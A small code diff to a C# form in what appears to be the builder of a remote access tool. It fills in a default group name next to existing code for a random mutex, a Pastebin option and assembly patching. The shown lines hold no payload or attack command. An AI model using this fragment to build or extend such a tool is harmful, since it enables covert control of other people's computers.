@@ -185,6 +185,8 @@ namespace Server.Forms
 
             if (string.IsNullOrWhiteSpace(txtMutex.Text)) txtMutex.Text = getRandomCharacters();
 
+            if (string.IsNullOrWhiteSpace(txtGroup.Text)) txtGroup.Text = "Default";
+
             if (chkPastebin.Checked && string.IsNullOrWhiteSpace(txtPastebin.Text)) return;
 
             ModuleDefMD asmDef = null;
